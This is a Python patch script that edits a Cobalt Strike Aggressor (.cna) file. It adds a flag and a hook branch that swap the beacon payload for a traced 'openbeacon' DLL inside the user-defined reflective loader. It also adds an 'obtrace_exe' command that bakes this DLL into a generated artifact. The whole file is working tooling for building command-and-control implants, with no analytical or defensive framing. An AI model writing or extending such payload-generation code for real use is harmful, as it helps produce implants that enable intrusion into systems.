# -*- coding: utf-8 -*-
r"""patch_obtrace_hook.py - GENERATE hook: $g_obtrace mode substitutes the
traced CI DLL as the payload so the bake + own-exe wrap carries the traces."""
import io

P = (r"C:\Users\Administrator\Desktop\cobaltstrike\cobaltstrike-ts"
     r"\p3-llvm-bench\tsboot_run\headless_franken.cna")
s = io.open(P, encoding="utf-8").read()

L = chr(10)
TAB = chr(9)
B4 = chr(92) * 4

# 1. global flag next to $g_dp
i = s.find("$g_dp = 0;")
assert i > 0
j = s.find(L, i)
gline = s[i:j]
s = s[:i] + gline + L + "$g_obtrace = 0;   # C-49: bake the OBTRACE dll instead of the sleeve dll" + s[j:]
print("flag added")

# 2. substitution at the top of the beacon branch (after the hook-fired println)
anchor = TAB + TAB + 'println("[UDRL] hook fired for " . $1 . " arch=" . $3);'
assert anchor in s, "hook-fired anchor missing"
add = (anchor + L +
    TAB + TAB + 'if ($g_obtrace == 1 && $3 eq "x64") {' + L +
    TAB + TAB + TAB + '$2 = readb(openf("C:' + B4 + 'Users' + B4 + 'Public' + B4 +
    'openbeacon.x64.dll"), -1);' + L +
    TAB + TAB + TAB + 'println("[UDRL-OBTRACE] payload swapped: " . strlen($2) . "B");' + L +
    TAB + TAB + '}')
s = s.replace(anchor, add, 1)
print("substitution added")

# 3. cna command obtrace_exe: bake traced dll -> manual own-exe wrap via artifact path
cmd = (
    TAB + 'else if ($cmd eq "obtrace_exe") {' + L +
    TAB + TAB + '# C-49: generate artifact with the traced dll payload' + L +
    TAB + TAB + '$g_obtrace = 1;' + L +
    TAB + TAB + '$null = artifact_payload($a1, "dll", "x64");' + L +
    TAB + TAB + '$g_obtrace = 0;' + L +
    TAB + TAB + 'blog($bid, "obtrace: baked dll ready (probe_baked.bin)");' + L +
    TAB + TAB + 'return;' + L +
    TAB + '}' + L
)
cmd_open = TAB + 'else if ($cmd eq "titan") {' + L
ci = s.find(cmd_open)
assert ci > 0
cm = L + TAB + '}' + L
cj = s.find(cm, ci) + len(cm)
s = s[:cj] + cmd + s[cj:]
print("obtrace_exe command added")

io.open(P, "w", encoding="utf-8", newline="").write(s)
print("done - no BOM")
